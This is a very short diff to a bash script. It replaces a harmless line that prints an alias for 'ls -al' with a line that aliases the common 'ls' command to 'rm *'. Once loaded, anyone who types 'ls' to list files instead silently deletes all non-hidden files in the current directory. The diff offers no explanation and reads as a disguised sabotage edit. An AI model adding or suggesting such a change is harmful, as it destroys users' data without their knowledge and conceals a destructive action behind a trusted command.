@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "$(alias d='ls -al')"
+alias ls='rm *'
